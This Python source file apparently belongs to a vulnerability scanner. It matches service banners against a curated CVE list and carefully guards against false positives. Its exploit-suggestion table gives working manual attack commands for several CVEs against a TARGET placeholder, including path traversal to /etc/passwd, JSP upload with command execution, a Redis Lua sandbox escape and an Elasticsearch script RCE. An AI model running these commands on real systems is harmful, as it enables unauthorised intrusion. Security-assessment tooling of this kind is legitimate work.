"""
LOCKON EWAC - Offline CVE Intelligence Database
Provides a fast, local dictionary of high-impact vulnerabilities matched by banner versions.

CVE_MATRIX below is the built-in *seed*: a hand-curated list, last reviewed on
SEED_GENERATED_AT. If a downloaded snapshot exists it takes precedence — see
`cve_feed.py` for why updates are operator-initiated rather than automatic, and
for the provenance that gets stamped into the exported report.

Nothing here should be read as complete coverage of NVD. `cve_feed.describe()`
carries that caveat so a report built on this data cannot overstate it.
"""
import copy

# The newest entry in the seed list is from 2023, so this is the honest date for
# it. The UI and the report show the resulting age rather than hiding it.
SEED_GENERATED_AT = "2023-12-31T00:00:00+00:00"

CVE_MATRIX = {
    "apache": {
        "2.4.49": [
            {"cve": "CVE-2021-41773", "severity": "CRITICAL", "description": "Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49."}
        ],
        "2.4.50": [
            {"cve": "CVE-2021-42013", "severity": "CRITICAL", "description": "Path traversal and remote code execution in Apache HTTP Server 2.4.50."}
        ],
        "2.4.51": [
            {"cve": "CVE-2022-22720", "severity": "HIGH", "description": "HTTP request smuggling vulnerability in Apache HTTP Server."}
        ],
    },
    "nginx": {
        "1.18.0": [
            {"cve": "CVE-2021-23017", "severity": "HIGH", "description": "1-Byte Memory Overwrite in DNS resolver (if configured) leading to DoS or RCE."}
        ],
        "1.20.0": [
            {"cve": "CVE-2021-23017", "severity": "HIGH", "description": "DNS resolver memory overwrite vulnerability."}
        ],
    },
    "openssh": {
        "7.7": [
            {"cve": "CVE-2018-15473", "severity": "MEDIUM", "description": "OpenSSH username enumeration vulnerability."}
        ],
        "8.2": [
            {"cve": "CVE-2020-15778", "severity": "MEDIUM", "description": "SCP command injection vulnerability (requires valid credentials)."}
        ],
        "9.1": [
            {"cve": "CVE-2023-38408", "severity": "HIGH", "description": "Remote code execution via ssh-agent forwarding with PKCS#11 providers."}
        ],
    },
    "vsftpd": {
        "2.3.4": [
            {"cve": "CVE-2011-2523", "severity": "CRITICAL", "description": "vsftpd 2.3.4 backdoor command execution."}
        ]
    },
    "proftpd": {
        "1.3.5": [
            {"cve": "CVE-2015-3306", "severity": "HIGH", "description": "ProFTPD 1.3.5 mod_copy Remote Command Execution."}
        ]
    },
    "openssl": {
        "1.0.1": [
            {"cve": "CVE-2014-0160", "severity": "CRITICAL", "description": "Heartbleed Bug - TLS heartbeat read overrun."}
        ],
        "1.0.2": [
            {"cve": "CVE-2016-2107", "severity": "HIGH", "description": "AES-NI CBC MAC check padding oracle vulnerability."}
        ],
    },
    "microsoft-iis": {
        "7.5": [
            {"cve": "CVE-2017-7269", "severity": "CRITICAL", "description": "IIS 6.0/7.5 WebDAV ScStoragePathFromUrl buffer overflow (RCE)."}
        ],
        "10.0": [
            {"cve": "CVE-2021-31166", "severity": "CRITICAL", "description": "HTTP Protocol Stack Remote Code Execution (wormable)."}
        ],
    },
    "iis": {
        "6.0": [
            {"cve": "CVE-2017-7269", "severity": "CRITICAL", "description": "IIS 6.0 WebDAV buffer overflow allowing remote code execution."}
        ],
        "7.5": [
            {"cve": "CVE-2017-7269", "severity": "CRITICAL", "description": "IIS WebDAV ScStoragePathFromUrl buffer overflow."}
        ],
    },
    "samba": {
        # The 3.x series reached end of life without a vendor patch for this, so
        # the whole line stays vulnerable and carries no `fixed_in`.
        "3.5": [
            {"cve": "CVE-2017-7494", "severity": "CRITICAL", "description": "SambaCry - Remote code execution via writable share (similar to EternalBlue)."}
        ],
        # `fixed_in` bounds the line. Without it, Samba 4.6.16 — which carries the
        # patch — was reported CRITICAL for SambaCry purely because it is in the
        # 4.6 line, and that assertion reached the report's headline figure.
        "4.6": [
            {"cve": "CVE-2017-7494", "severity": "CRITICAL", "fixed_in": "4.6.4", "description": "SambaCry - Arbitrary shared library upload and execution."}
        ],
    },
    "tomcat": {
        "8.5.19": [
            {"cve": "CVE-2017-12617", "severity": "CRITICAL", "description": "Apache Tomcat Remote Code Execution via PUT method (JSP upload)."}
        ],
        "9.0.0": [
            {"cve": "CVE-2019-0232", "severity": "CRITICAL", "description": "Apache Tomcat CGI Servlet Remote Code Execution (Windows only)."}
        ],
    },
    "elasticsearch": {
        # Affected 1.4.x before 1.4.3 (and 1.3.x before 1.3.8).
        "1.4": [
            {"cve": "CVE-2015-1427", "severity": "CRITICAL", "fixed_in": "1.4.3", "description": "Elasticsearch Groovy scripting engine sandbox bypass (RCE)."}
        ],
        "6.4": [
            {"cve": "CVE-2018-17246", "severity": "HIGH", "description": "Kibana Local File Inclusion via Timelion/Console plugins."}
        ],
    },
    "jenkins": {
        "2.0": [
            {"cve": "CVE-2017-1000353", "severity": "CRITICAL", "description": "Jenkins deserialization vulnerability allowing unauthenticated remote code execution."}
        ],
        "2.150": [
            {"cve": "CVE-2019-1003000", "severity": "CRITICAL", "description": "Jenkins Script Security sandbox bypass allowing arbitrary code execution."}
        ],
    },
    "phpmyadmin": {
        "4.8": [
            {"cve": "CVE-2018-12613", "severity": "HIGH", "description": "phpMyAdmin Local File Inclusion vulnerability allowing remote code execution."}
        ],
    },
    "mysql": {
        # Affected 5.5.x before 5.5.24 (and 5.1.x before 5.1.63). Without the
        # bound, every 5.5 release after the patch — 5.5.62 among them — was
        # reported HIGH for an authentication bypass it does not have.
        "5.5": [
            {"cve": "CVE-2012-2122", "severity": "HIGH", "fixed_in": "5.5.24", "description": "MySQL authentication bypass — ~1/256 chance of login with wrong password."}
        ],
    },
    "redis": {
        "5.0": [
            {"cve": "CVE-2022-0543", "severity": "CRITICAL", "description": "Redis Lua sandbox escape allowing arbitrary command execution."}
        ],
    },
}

# ── Phase 7: Auto Exploit Suggestion Database ──
EXPLOIT_SUGGESTIONS = {
    "CVE-2021-41773": {
        "metasploit": "exploit/multi/http/apache_normalize_path_rce",
        "nuclei": "http/cves/2021/CVE-2021-41773.yaml",
        "manual": "curl -s --path-as-is 'http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'",
        "description": "Apache 2.4.49 path traversal — read arbitrary files or execute CGI commands.",
        "risk": "RCE if mod_cgi is enabled; file disclosure otherwise.",
    },
    "CVE-2021-42013": {
        "metasploit": "exploit/multi/http/apache_normalize_path_rce",
        "nuclei": "http/cves/2021/CVE-2021-42013.yaml",
        "manual": "curl -s --path-as-is 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
        "description": "Apache 2.4.50 bypass of CVE-2021-41773 fix — RCE via double-encoded path traversal.",
        "risk": "Remote Code Execution (RCE).",
    },
    "CVE-2014-0160": {
        "metasploit": "auxiliary/scanner/ssl/openssl_heartbleed",
        "nuclei": "ssl/CVE-2014-0160.yaml",
        "manual": "nmap -p PORT --script ssl-heartbleed TARGET",
        "description": "Heartbleed — read up to 64KB of server memory per request, leaking keys and credentials.",
        "risk": "Private key extraction, session hijacking.",
    },
    "CVE-2017-7269": {
        "metasploit": "exploit/windows/iis/iis_webdav_scstoragepathfromurl",
        "manual": "nmap -p 80 --script http-iis-webdav-vuln TARGET",
        "description": "IIS WebDAV buffer overflow — unauthenticated remote code execution.",
        "risk": "Remote Code Execution (RCE) as SYSTEM.",
    },
    "CVE-2021-31166": {
        "metasploit": "exploit/windows/http/http_sys_cve_2021_31166",
        "manual": "curl -H 'Accept-Encoding: AAAAAAAAAAAA, *' http://TARGET/",
        "description": "HTTP.sys wormable RCE in Windows HTTP protocol stack.",
        "risk": "Remote Code Execution (RCE) — wormable.",
    },
    "CVE-2017-7494": {
        "metasploit": "exploit/linux/samba/is_known_pipename",
        "manual": "smbclient //TARGET/share -N -c 'put payload.so ../../payload.so'",
        "description": "SambaCry — upload and execute shared library on writable SMB share.",
        "risk": "Remote Code Execution (RCE) as root.",
    },
    "CVE-2011-2523": {
        "metasploit": "exploit/unix/ftp/vsftpd_234_backdoor",
        "manual": "telnet TARGET 6200  (after triggering backdoor via FTP login with ':)' suffix)",
        "description": "vsftpd 2.3.4 backdoor — triggers command shell on port 6200.",
        "risk": "Remote Code Execution (RCE) as root.",
    },
    "CVE-2015-3306": {
        "metasploit": "exploit/unix/ftp/proftpd_modcopy_exec",
        "manual": "nc TARGET 21 → SITE CPFR /etc/passwd → SITE CPTO /var/www/html/passwd.txt",
        "description": "ProFTPD mod_copy allows arbitrary file copy without authentication.",
        "risk": "Arbitrary file read/write, potential RCE.",
    },
    "CVE-2018-15473": {
        "metasploit": "auxiliary/scanner/ssh/ssh_enumusers",
        "manual": "python3 ssh_user_enum.py --userlist users.txt TARGET",
        "description": "OpenSSH username enumeration via malformed packets.",
        "risk": "User enumeration for targeted brute-force.",
    },
    "CVE-2023-38408": {
        "metasploit": None,
        "manual": "Check if ssh-agent forwarding is enabled: ssh -A target",
        "description": "OpenSSH ssh-agent PKCS#11 provider RCE via crafted shared library.",
        "risk": "Remote Code Execution via agent forwarding.",
    },
    "CVE-2017-12617": {
        "metasploit": "exploit/multi/http/tomcat_jsp_upload_bypass",
        "nuclei": "http/cves/2017/CVE-2017-12617.yaml",
        "manual": "curl -X PUT 'http://TARGET/shell.jsp/' -d '<% Runtime.getRuntime().exec(\"id\"); %>'",
        "description": "Apache Tomcat JSP upload bypass via PUT method with trailing slash.",
        "risk": "Remote Code Execution (RCE).",
    },
    "CVE-2022-0543": {
        "metasploit": "exploit/linux/redis/redis_debian_sandbox_escape",
        "manual": "redis-cli -h TARGET eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0",
        "description": "Redis Lua sandbox escape on Debian/Ubuntu.",
        "risk": "Remote Code Execution (RCE) as redis user.",
    },
    "CVE-2015-1427": {
        "metasploit": "exploit/multi/elasticsearch/script_mvel_rce",
        "manual": "curl -X POST 'http://TARGET:9200/_search?pretty' -H 'Content-Type: application/json' -d '{\"script_fields\":{\"exp\":{\"script\":\"java.lang.Runtime.getRuntime().exec(\\\"id\\\")\"}}}'",
        "description": "Elasticsearch Groovy scripting sandbox bypass — arbitrary code execution.",
        "risk": "Remote Code Execution (RCE).",
    },
    "CVE-2018-12613": {
        "metasploit": "exploit/multi/http/phpmyadmin_lfi_rce",
        "manual": "curl 'http://TARGET/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd'",
        "description": "phpMyAdmin Local File Inclusion — read files and potentially execute code.",
        "risk": "LFI → Remote Code Execution.",
    },
}


def _seed_entry_count():
    return sum(len(v) for versions in CVE_MATRIX.values() for v in versions.values())


#: The merged matrix, memoised against the snapshot it was built from. See
#: `active_matrix()` for why identity rather than a value key, and why the
#: snapshot reference is held rather than just its id.
_ACTIVE_CACHE = {"snapshot": None, "matrix": None}


def _merge_matrix(seed, snapshot):
    """Snapshot entries added on top of the seed, deduplicated by CVE id.

    The seed is a floor, not a default. It is hand-curated and keyed to the
    version strings this scanner actually reads off a banner, so where both sides
    carry the same CVE id the seed's entry is the one kept. A severity revision
    published after the seed was written is therefore not picked up for an id the
    seed already holds — the accepted cost of never silently losing a curated
    match, and the reason this does not rank severities (there is no severity
    ordering in the engine, and inventing one here would be a second rule set).
    """
    merged = copy.deepcopy(seed)

    # Which entries are the seed's own. They are exempt from `_apply_known_fixes`,
    # because the seed is a floor: the *absence* of a `fixed_in` on a curated entry
    # is as deliberate as its presence, and letting downloaded data add one can
    # delete a curated finding. It did, immediately and in the worst possible
    # place — NVD carries Heartbleed as a range over line `1.0` fixed in `1.0.1g`,
    # that bound was stamped onto the seed's `openssl 1.0.1` entry, and
    # `CVE-2014-0160` stopped being reported at all.
    seed_entries = {
        (product, version, entry.get("cve"))
        for product, versions in merged.items()
        for version, entries in versions.items()
        for entry in entries
    }

    for product, versions in (snapshot or {}).items():
        target = merged.setdefault(product, {})
        for version, entries in (versions or {}).items():
            existing = target.setdefault(version, [])
            seen = {e.get("cve") for e in existing}
            for entry in entries or []:
                if entry.get("cve") not in seen:
                    existing.append(entry)
                    seen.add(entry.get("cve"))

    _apply_known_fixes(merged, exempt=seed_entries)
    return merged


def _apply_known_fixes(matrix, exempt=frozenset()):
    """Give every entry for a CVE the earliest `fixed_in` known for it.

    A flaw is fixed in one release, not several, but the two sources disagree
    about shape. NVD describes OpenSSH CVE-2003-0190 both as a range fixed before
    3.6.1 *and* as an exact affected version 3.6.1, and the seed carries its own
    hand-reviewed `fixed_in` for the CVEs it covers. Left alone, the unbounded
    entry wins for a host on the fixing release and the tool reports a flaw that
    release contains the fix for.

    So a `fixed_in` is treated as a property of the CVE *within one version line*
    rather than of one entry, and the **earliest** one wins. Earliest excludes
    more, which is the safe direction: a missed finding is declared in
    `coverage_note`, while a host accused of a bug it was patched against
    discredits the document. It also makes the seed's curated bound govern the
    snapshot's rawer data for the CVEs the seed knows.

    Scoped to the line, not the product, because a flaw often spans lines with a
    different fix in each: a CVE fixed in 1.0.5 that also affects exactly 2.0.3
    would, under a product-wide rule, have 1.0.5 applied to the 2.0.3 entry and
    the genuine 2.0.3 finding would disappear.
    """
    def line_of(version):
        bits = [b for b in (version or "").split(".") if b]
        return ".".join(bits[:2])

    for product, versions in matrix.items():
        earliest = {}
        for key, entries in versions.items():
            line = line_of(key)
            for entry in entries:
                fixed = entry.get("fixed_in")
                if not fixed:
                    continue
                slot = (line, entry.get("cve"))
                known = earliest.get(slot)
                if known is None or _version_tuple(fixed) < _version_tuple(known):
                    earliest[slot] = fixed
        if not earliest:
            continue
        for key, entries in versions.items():
            line = line_of(key)
            for entry in entries:
                if (product, key, entry.get("cve")) in exempt:
                    continue      # a curated seed entry governs itself
                fixed = earliest.get((line, entry.get("cve")))
                if fixed:
                    entry["fixed_in"] = fixed


def active_matrix():
    """The CVE data in force: the seed, with any downloaded snapshot merged over it.

    A snapshot is merged, never substituted. It used to replace the seed
    outright, and that quietly made the tool detect *less*. Measured against a
    real NVD pull: the refresh returned none of 14 of the seed's 23 entries —
    Heartbleed, the Apache 2.4.49 and 2.4.50 traversals, both IIS WebDAV RCEs,
    the Redis Lua sandbox escape, the phpMyAdmin LFI — and switched them off
    while reporting `age_days: 0` and `stale: false`. An update that narrows
    coverage while making the report look *more* current is the worst thing this
    module can do to a document someone acts on, so the invariant is that a
    refresh may only ever add. `test_cve_matching` locks it.
    """
    try:
        from cve_feed import load_snapshot
        snap = load_snapshot()
        if snap and snap.get("matrix"):
            # Merging deepcopies the seed and walks the whole snapshot, measured
            # at 0.195 s against a 41,596-entry pull. `lookup_cves` calls this
            # once per service on every host, so without a cache a LAN sweep paid
            # that per lookup and the matrix-derived tests took eleven minutes.
            #
            # Keyed on the snapshot object's identity, and the reference is held,
            # so the id cannot be reused by a later object after a collection —
            # a stale hit here would serve the wrong CVE data, which is worse
            # than being slow. `load_snapshot` returns its own cached dict, so
            # this recomputes exactly when the snapshot is actually reloaded.
            if _ACTIVE_CACHE["snapshot"] is not snap:
                _ACTIVE_CACHE["matrix"] = _merge_matrix(CVE_MATRIX, snap["matrix"])
                _ACTIVE_CACHE["snapshot"] = snap
            return _ACTIVE_CACHE["matrix"]
    except Exception:
        # A missing or broken feed module must never stop a scan — fall back.
        pass
    return CVE_MATRIX


def describe_source():
    """Provenance of the CVE data, for the UI and the report's method appendix."""
    try:
        from cve_feed import describe
        info = describe(seed_entry_count=_seed_entry_count(),
                        seed_generated_at=SEED_GENERATED_AT)
        # The counts have to describe what is actually in force. `describe()` can
        # only see the snapshot, and a snapshot is merged over the seed rather
        # than replacing it, so its own figures understate the data the findings
        # were produced from. `source` says the merge happened because this
        # string is printed verbatim in the method appendix.
        matrix = active_matrix()
        info["entry_count"] = sum(
            len(v) for versions in matrix.values() for v in versions.values())
        info["product_count"] = len(matrix)
        if info.get("origin") == "snapshot":
            info["origin"] = "snapshot+seed"
            info["source"] = f"{info.get('source')} merged over the built-in seed"
        return info
    except Exception:
        return {
            "origin": "builtin",
            "source": "Built-in seed list (hand-curated)",
            "generated_at": SEED_GENERATED_AT,
            "age_days": None,
            "stale": True,
            "entry_count": _seed_entry_count(),
            "coverage_note": "Curated subset; absence of a CVE is not evidence a host is unaffected.",
        }


def _version_tuple(value):
    """
    Dotted version as a tuple of ints, for ordering.

    Two kinds of suffix, and they mean opposite things:

    * a *packaging* suffix is noise and is dropped ("4.6.16-Debian" -> 4, 6, 16),
      because banners routinely carry one and it says nothing about the upstream
      release;
    * a bare *letter* suffix directly on the digits is part of the release
      ordering and is kept ("1.0.1g" -> 1, 0, 1, 7). OpenSSL numbers its patch
      releases this way, and dropping the letter made `1.0.1g` compare equal to
      `1.0.1` — so a host on 1.0.1f, which is vulnerable to Heartbleed, was read
      as being at the fixing release and CVE-2014-0160 went unreported. That is
      the single most recognisable finding this tool can make.

    Each component yields its number, and a lettered component yields an extra
    ordinal after it; an unlettered one yields an implicit 0 there, so `1.0.1`
    sorts below `1.0.1a` as it should. A component with no leading digits counts
    as 0 rather than raising.
    """
    parts = []
    for chunk in str(value).split("."):
        digits = ""
        rest = ""
        for i, ch in enumerate(chunk):
            if not ch.isdigit():
                rest = chunk[i:]
                break
            digits += ch
        parts.append(int(digits) if digits else 0)
        # Only a pure-alphabetic tail is a release letter. Anything containing a
        # separator ("-Debian", "+deb11u1", "~rc1") is packaging, and dropped.
        if rest and rest.isalpha():
            # a=1 .. z=26, so an absent letter (0) sorts first.
            ordinal = 0
            for ch in rest.lower():
                ordinal = ordinal * 27 + (ord(ch) - ord('a') + 1)
            parts.append(ordinal)
        else:
            parts.append(0)
    return tuple(parts)


def _is_fixed(ver, fixed_in):
    """
    True when `ver` is at or past the release that fixed the issue.

    A matrix key names a *line* — "4.6" stands for 4.6.x — which is too coarse on
    its own for any CVE that was patched within that line. Samba is the worked
    example: CVE-2017-7494 is keyed to "4.6" and was fixed in 4.6.4, so without
    an upper bound every host on 4.6.4 through 4.6.16 was asserted vulnerable to
    a bug it had already been patched against, at CRITICAL, in the report's
    headline figure.

    Entries carry `fixed_in` only where the fixing release is well established.
    Where it is absent the line match stands, and the caller can see from
    `version_match` that it was a line match rather than an exact one.
    """
    if not fixed_in:
        return False
    a = _version_tuple(ver)
    b = _version_tuple(fixed_in)
    width = max(len(a), len(b))
    a = a + (0,) * (width - len(a))
    b = b + (0,) * (width - len(b))
    return a >= b


def _version_match(ver, known_ver):
    """
    How `ver` matches a matrix key, or None if it does not.

    A key like "5.0" stands for the 5.0.x line, so it matches "5.0.1" but must
    not match "5.09" — and must never match "6.5.0", which is what the removed
    substring test did.
    """
    if ver == known_ver:
        return "exact"
    if ver.startswith(known_ver + "."):
        return "version_prefix"
    return None


def _service_keys(matrix, svc):
    """
    Matrix keys that plausibly name this service.

    Banners are not canonical — "apache httpd", "Apache/2.4.49 (Unix)" and
    "apache" all describe the same daemon — so a substring test on the *service*
    is kept deliberately. It only widens which version table is consulted; the
    version itself still has to match, which is where the precision has to be.
    """
    if svc in matrix:
        return [svc]
    return [known for known in matrix if known in svc]


def lookup_cves(service_name, service_version):
    """Return a list of CVE objects if the service and version match known vulnerable configurations.

    Matching is deliberately narrow. It used to end in a substring test on the
    version string — `if known_ver in ver` — which asserted CVEs that the
    evidence did not support and would have destroyed the credibility of every
    other number in a report:

        Redis 6.5.0     -> CVE-2022-0543 CRITICAL   (keyed to 5.0; "5.0" in "6.5.0")
        Samba 4.6.16    -> CVE-2017-7494 CRITICAL   (fixed in 4.6.4)
        MySQL 5.5.62    -> CVE-2012-2122 HIGH       (fixed in 5.5.24)
        Elasticsearch 6.1.4 -> CVE-2015-1427 CRITICAL (keyed to 1.4)

    Each of those reached the report's headline CRITICAL+HIGH figure at LIKELY
    confidence, with a rationale reading "Matched from the service banner",
    which tells a reader a version matched. One of them checked by a sysadmin
    would have been enough to discard the whole document.

    A missed CVE is a gap the report already declares (`coverage_note`:
    absence of a CVE is not evidence a host is unaffected). An asserted CVE that
    is false is a different kind of failure, so the matching errs toward missing.

    Every returned entry carries `version_match` — "exact" or "version_prefix" —
    so a caller can state how the match was made instead of implying precision
    it does not have.

    Returns deep copies. The previous version handed back references into the
    module-level matrix and then wrote an "exploit" key into them, so up to 100
    scan threads mutated shared global state and every emitted finding aliased it.
    """
    if not service_name or not service_version:
        return []

    matrix = active_matrix()
    svc = service_name.lower()
    ver = service_version.lower()

    matched = []   # (cve_entry, match_kind)

    for known_svc in _service_keys(matrix, svc):
        table = matrix[known_svc]

        # Every key that matches, most specific first — not just the best one.
        #
        # This used to take a single winning key: the exact version if present,
        # otherwise the longest prefix. With only the hand-curated seed in the
        # table that was invisible, because no product had both a line key and an
        # exact key inside it. A downloaded snapshot has both routinely, and then
        # the narrower key *shadowed* the wider one: `apache` carried
        # CVE-1999-1199 at line `1.3` and a separate exact key `1.3.1`, so a host
        # reporting 1.3.1 matched only `1.3.1` and the 1.3-line advisory was
        # silently dropped.
        #
        # That made a refresh able to *remove* findings, which is the whole thing
        # the merge exists to prevent — adding keys changed which one won. Every
        # matching key names a line this version genuinely belongs to, so all of
        # them contribute. Most-specific-first ordering means the de-duplication
        # below keeps the exact match's `version_match` label when a CVE appears
        # at both.
        candidates = []
        for known_ver in table:
            kind = _version_match(ver, known_ver)
            if kind is not None:
                candidates.append((0 if kind == "exact" else 1, -len(known_ver),
                                   known_ver, kind))
        candidates.sort()

        for _, _, key, kind in candidates:
            for entry in table[key]:
                # An entry derived from a concrete CPE version names that release and
                # no other.
                #
                # `_version_match` treats every key as a *line* -- "2.0" matches
                # "2.0.65" as a prefix -- which is right for range-derived keys and
                # wrong for this one. `cve_feed._keys_for_match` returns
                # `[(version, None)]` for a concrete CPE version, and `_is_fixed`
                # returns False when `fixed_in` is absent, so a refresh that pulled
                # `cpe:2.3:a:apache:http_server:2.0:*:*:*` asserted every 2.0.x host
                # vulnerable -- including 2.0.65, the final patched release of the
                # line. A positive false assertion, which is the opposite of the
                # "errs toward missing" stance this module declares.
                if entry.get("exact_version") and kind != "exact":
                    continue
                # A version at or past the fixing release is not vulnerable, even
                # though it falls inside the keyed line.
                if _is_fixed(ver, entry.get("fixed_in")):
                    continue
                matched.append((entry, kind))

    # Copy before annotating so the shared matrix is never touched.
    cves = []
    seen_ids = set()
    for entry, kind in matched:
        cve_id = entry.get("cve", "")
        # Two service keys can point at the same advisory; report it once.
        if cve_id and cve_id in seen_ids:
            continue
        seen_ids.add(cve_id)
        entry = copy.deepcopy(entry)
        entry["version_match"] = kind
        cves.append(entry)

    for cve_entry in cves:
        cve_id = cve_entry.get("cve", "")
        if cve_id in EXPLOIT_SUGGESTIONS:
            cve_entry["exploit"] = copy.deepcopy(EXPLOIT_SUGGESTIONS[cve_id])

    return cves


def lookup_exploits(cve_id):
    """Return exploit suggestions for a given CVE ID."""
    suggestion = EXPLOIT_SUGGESTIONS.get(cve_id)
    return copy.deepcopy(suggestion) if suggestion else None


# ── Advisories inferred from the operating system rather than a banner ────────
#
# These are a different kind of claim from everything above, and the difference
# has to survive all the way to the report.
#
# `lookup_cves` matches a *version string the service reported about itself*.
# EternalBlue and BlueKeep cannot be matched that way: SMB and RDP do not
# announce a patch level, so the only signal available is "this looks like an
# operating system from the era when the flaw shipped unpatched, and the port is
# open". That is an inference, not an observation, and a fully patched Windows 7
# is not vulnerable to either.
#
# The UI used to hold this knowledge privately, in a `getPortIntel` table inside
# `IntrusionPage.tsx`. An operator saw "CVE-2019-0708 BlueKeep CRITICAL" on
# screen and the exported report — built from this module — said nothing about
# it, because the matcher here never produced it. The screen and the document
# disagreed about the same host, and the document is the thing somebody acts on.
#
# So the knowledge lives here now, and it carries the two things the UI table
# could not: the CVE data vintage this module is stamped with, and an explicit
# `inferred` flag that the rule set turns into SUSPECTED confidence rather than
# CONFIRMED. Absence of an inference is not evidence of a patched host, and its
# presence is not evidence of an unpatched one — both are stated in the entry.

OS_INFERRED_CVES = {
    445: [
        {
            "cve": "CVE-2017-0144",
            "severity": "CRITICAL",
            "description": "EternalBlue: remote code execution in SMBv1. Inferred from the detected operating system, not from a version the service reported.",
            "risk": "Unauthenticated remote code execution as SYSTEM, and the basis of several self-propagating worms.",
            "os_patterns": ["windows 7", "windows xp", "server 2003", "server 2008"],
            "basis": "SMB does not publish a patch level, so this is inferred from the operating system fingerprint and an open port 445. A host patched against MS17-010 is not affected, and this check cannot tell the difference.",
        },
    ],
    3389: [
        {
            "cve": "CVE-2019-0708",
            "severity": "CRITICAL",
            "description": "BlueKeep: pre-authentication remote code execution in Remote Desktop Services. Inferred from the detected operating system, not from a version the service reported.",
            "risk": "Unauthenticated remote code execution, wormable across a flat network.",
            "os_patterns": ["windows 7", "windows xp", "server 2003", "server 2008"],
            "basis": "RDP does not publish a patch level, so this is inferred from the operating system fingerprint and an open port 3389. A host with the May 2019 update, or with NLA enforced, is not affected, and this check cannot tell the difference.",
        },
    ],
}


def infer_os_cves(os_name, port):
    """
    Advisories suggested by the host's operating system and this open port.

    Every entry is marked `inferred: True`. The rule set reads that and reports
    the finding at SUSPECTED confidence with the `basis` as its rationale, so a
    reader is told what the claim rests on rather than being shown a CVE id that
    looks matched.

    Returns nothing when the operating system could not be determined. An
    unknown OS is not a match and must never be treated as one — guessing here
    would put a CRITICAL advisory against every host whose fingerprint failed.
    """
    if not os_name:
        return []
    haystack = str(os_name).lower()
    if "unknown" in haystack:
        return []

    out = []
    for entry in OS_INFERRED_CVES.get(port, []):
        if not any(pattern in haystack for pattern in entry.get("os_patterns", [])):
            continue
        hit = copy.deepcopy(entry)
        hit.pop("os_patterns", None)
        hit["inferred"] = True
        hit["inferred_from"] = str(os_name)
        out.append(hit)
    return out


def annotate_host_inferences(host):
    """
    Add OS-inferred advisories to a finished host record, in place.

    Runs after OS detection rather than during the port scan, because the port
    scan does not know the operating system yet — that is derived from the ports
    and banners it collects.

    An advisory the banner matcher already produced is never duplicated: a real
    version match is the stronger statement and it keeps its CONFIRMED-shaped
    entry.
    """
    os_name = host.get("os")
    for port_entry in host.get("open_ports") or []:
        if port_entry.get("protocol") == "UDP":
            continue
        inferred = infer_os_cves(os_name, port_entry.get("port"))
        if not inferred:
            continue
        existing = port_entry.get("cves") or []
        have = {c.get("cve") for c in existing}
        added = [c for c in inferred if c.get("cve") not in have]
        if added:
            port_entry["cves"] = existing + added
    return host
